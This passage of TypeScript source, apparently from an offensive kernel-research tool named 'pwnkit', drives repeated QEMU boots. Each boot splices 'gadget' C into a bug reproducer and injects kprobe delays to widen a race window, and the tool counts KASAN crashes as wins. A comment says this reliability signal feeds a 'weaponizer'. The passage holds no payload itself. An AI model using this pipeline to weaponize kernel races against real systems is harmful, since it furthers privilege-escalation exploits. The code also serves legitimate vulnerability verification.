  kasanSplat: boolean;
  /** Crash signature (e.g. "kasan-uaf") when known. */
  signature?: string;
  /** Optional raw context (dmesg path, note) for archival. */
  detail?: string;
}

/**
 * Runs ONE widened attempt (one VM boot) and reports whether the widened race
 * produced a KASAN splat. Injectable so tests stub the VM entirely; the live
 * implementation is {@link makeKernelVmRaceProver}.
 */
export type RaceProver = (input: RaceProverInput) => Promise<RaceProverOutcome>;

export interface AttemptWinRaceOptions {
  /** How many VM boots to try. Default 5. */
  boots?: number;
  /** Injectable prover (tests). Defaults to a prover that throws a clear error. */
  prover?: RaceProver;
  /** mdelay to inject at the faulting PC (ms). Default 5. */
  widenDelayMs?: number;
  /** Stop early once this many wins are seen (0 = run all boots). Default 0. */
  stopAfterWins?: number;
  logger?: (line: string) => void;
}

export interface AttemptWinRaceResult {
  /** True once at least one boot produced a KASAN splat. */
  confirmed: boolean;
  /** Boots actually run. */
  boots: number;
  /** Boots that produced a splat. */
  wins: number;
  /** wins / boots (0 when no boots ran). */
  rate: number;
  /** First observed crash signature, if any. */
  signature?: string;
  /** Ordered gadget names composed for the attempt. */
  gadgets: GadgetKind[];
  /** Env carried into the prover for the attempt. */
  proverEnv: Record<string, string>;
  /** Per-boot outcomes, in order. */
  outcomes: RaceProverOutcome[];
}

function throwingProver(): RaceProver {
  return async () => {
    throw new Error(
      "attemptWinRace: no RaceProver supplied — pass opts.prover (tests) or " +
        "makeKernelVmRaceProver({ reproducerPath, kernelTree }) for a live on-box run",
    );
  };
}

/**
 * Compose the selected gadgets and drive the widened race across N boots,
 * reporting whether it became a reliable KASAN splat.
 *
 * The gadget C + merged env are computed once (deterministic); each boot calls
 * the injected {@link RaceProver}. `confirmed` is true after the first splat;
 * `rate` = wins/boots gives the reliability signal the weaponizer wants.
 */
export async function attemptWinRace(
  candidate: RaceCandidate,
  gadgets: RaceGadget[],
  opts: AttemptWinRaceOptions = {},
): Promise<AttemptWinRaceResult> {
  const boots = Math.max(1, opts.boots ?? 5);
  const stopAfterWins = Math.max(0, opts.stopAfterWins ?? 0);
  const prover = opts.prover ?? throwingProver();
  const log = opts.logger;

  const composed = composeGadgetSetup(gadgets);
  const widen = candidateWiden(candidate);

  const outcomes: RaceProverOutcome[] = [];
  let wins = 0;
  let signature: string | undefined;
  let ran = 0;

  for (let bootIndex = 0; bootIndex < boots; bootIndex++) {
    ran++;
    const outcome = await prover({
      candidate,
      setupC: composed.setupC,
      proverEnv: composed.proverEnv,
      ...(widen ? { widen } : {}),
      bootIndex,
    });
    outcomes.push(outcome);
    if (outcome.kasanSplat) {
      wins++;
      if (!signature && outcome.signature) signature = outcome.signature;
      log?.(`[race-gadgets:win] boot ${bootIndex} splat${outcome.signature ? ` (${outcome.signature})` : ""}`);
    }
    if (stopAfterWins > 0 && wins >= stopAfterWins) break;
  }

  return {
    confirmed: wins > 0,
    boots: ran,
    wins,
    rate: ran > 0 ? wins / ran : 0,
    ...(signature ? { signature } : {}),
    gadgets: composed.gadgetNames,
    proverEnv: composed.proverEnv,
    outcomes,
  };
}

// ── Real on-box prover glue (kernel-vm-runner) ──────────────────────

/** Marker in a base reproducer where gadget C is spliced (before the race). */
export const GADGET_SETUP_MARKER = "// PWNKIT_RACE_GADGET_SETUP";

/**
 * Splice composed gadget C into a base reproducer. If the reproducer contains
 * {@link GADGET_SETUP_MARKER}, the C replaces the marker in place; otherwise it
 * is inserted at the top of `main(` (best-effort), or prepended as a fallback.
 * Pure + testable — no I/O.
 */
export function spliceGadgetSetup(reproducer: string, setupC: string): string {
  if (reproducer.includes(GADGET_SETUP_MARKER)) {
    return reproducer.replace(GADGET_SETUP_MARKER, setupC);
  }
  const mainMatch = reproducer.match(/\bmain\s*\([^)]*\)\s*\{/);
  if (mainMatch && mainMatch.index !== undefined) {
    const insertAt = mainMatch.index + mainMatch[0].length;
    return reproducer.slice(0, insertAt) + "\n" + setupC + "\n" + reproducer.slice(insertAt);
  }
  return setupC + "\n" + reproducer;
}

/** Build the `PWNKIT_KERNEL_QEMU_WIDEN_*` env for an mdelay-kprobe widen. Pure. */
export function buildWidenEnv(widen: WidenSpec | undefined, delayMs: number): Record<string, string> {
  if (!widen) return {};
  return {
    PWNKIT_KERNEL_QEMU_WIDEN_SYMBOL: widen.symbol,
    PWNKIT_KERNEL_QEMU_WIDEN_OFFSET: `0x${widen.offset.toString(16)}`,
    PWNKIT_KERNEL_QEMU_WIDEN_DELAY_MS: String(delayMs),
  };
}

/** Map a `KernelFindingVerification` to a per-boot race outcome. Pure. */
export function mapVerificationToOutcome(v: KernelFindingVerification): RaceProverOutcome {
  return {
    kasanSplat: v.status === "reproduced",
    ...(v.signature ? { signature: v.signature } : {}),
    detail: `status=${v.status} dmesg=${v.dmesg_path}`,
  };
}

export interface KernelVmRaceProverBase {
  /** Base C reproducer path (gadget C is spliced into a copy of it). */
  reproducerPath: string;
  /** Linux source tree the kernel is built from. */
  kernelTree: string;
  kernelConfig?: string;
  expectedSignature?: string;
  cacheDir?: string;
  widenDelayMs?: number;
  /** Injectable I/O (tests). Defaults to node fs. `write` returns the path used. */
  io?: {
    read: (path: string) => string;
    write: (content: string, bootIndex: number) => string;
  };
  /** Injectable verifier (tests). Defaults to the real `verifyKernelFinding`. */
  verify?: (opts: VerifyKernelFindingOptions) => Promise<KernelFindingVerification>;
  logger?: (line: string) => void;
}

/**
 * Wire the real on-box race-widening prover: per boot it splices the composed
 * gadget C into the base reproducer, sets the widen (`PWNKIT_KERNEL_QEMU_WIDEN_*`)
 * and gadget (`PWNKIT_RACE_*`) env, and runs `verifyKernelFinding` (build-cached
 * kernel + QEMU boot). Maps a `reproduced` status to a KASAN-splat win.
 *
 * The env-splice-verify glue is fully unit-tested via the `verify` / `io`
 * injection points; the default path boots real VMs and is exercised only on
 * the bench, never in CI.
 */
export function makeKernelVmRaceProver(base: KernelVmRaceProverBase): RaceProver {
  const delayMs = base.widenDelayMs ?? 5;
  const io: NonNullable<KernelVmRaceProverBase["io"]> = base.io ?? {
    read: (p: string) => readFileSync(p, "utf-8"),
    write: (content: string, bootIndex: number) => {
      const dir = mkdtempSync(join(tmpdir(), "pwnkit-race-"));
      const out = join(dir, `repro-widened-boot${bootIndex}.c`);
      writeFileSync(out, content, "utf-8");
      return out;
    },
  };
  const verify = base.verify ?? defaultVerify;

  return async (input: RaceProverInput): Promise<RaceProverOutcome> => {
    const baseSrc = io.read(base.reproducerPath);
    const widenedSrc = spliceGadgetSetup(baseSrc, input.setupC);
    const widenedPath = io.write(widenedSrc, input.bootIndex);

    const widenEnv = buildWidenEnv(input.widen, delayMs);
    const carried = { ...input.proverEnv, ...widenEnv };
    const restore = setEnv(carried);
    try {
      const v = await verify({
        reproducerPath: widenedPath,
        kernelTree: base.kernelTree,
        ...(base.kernelConfig ? { kernelConfig: base.kernelConfig } : {}),
        ...(base.expectedSignature ? { expectedSignature: base.expectedSignature } : {}),
        ...(base.cacheDir ? { cacheDir: base.cacheDir } : {}),
        ...(base.logger ? { logger: base.logger } : {}),
      });
      return mapVerificationToOutcome(v);
    } finally {
      restore();
    }
  };
}

/** Set env keys, returning a restore fn. Exported for the glue + tests. */
export function setEnv(env: Record<string, string>): () => void {
  const prev: Record<string, string | undefined> = {};
  for (const [k, v] of Object.entries(env)) {
    prev[k] = process.env[k];
    process.env[k] = v;
  }
  return () => {
    for (const [k, v] of Object.entries(prev)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
  };
}

// Real verifier is imported lazily so this module (and its tests) never pull the
// QEMU/child-process machinery unless a live run actually calls it.
async function defaultVerify(opts: VerifyKernelFindingOptions): Promise<KernelFindingVerification> {
  const mod = await import("./kernel-vm-runner.js");
  return mod.verifyKernelFinding(opts);
}
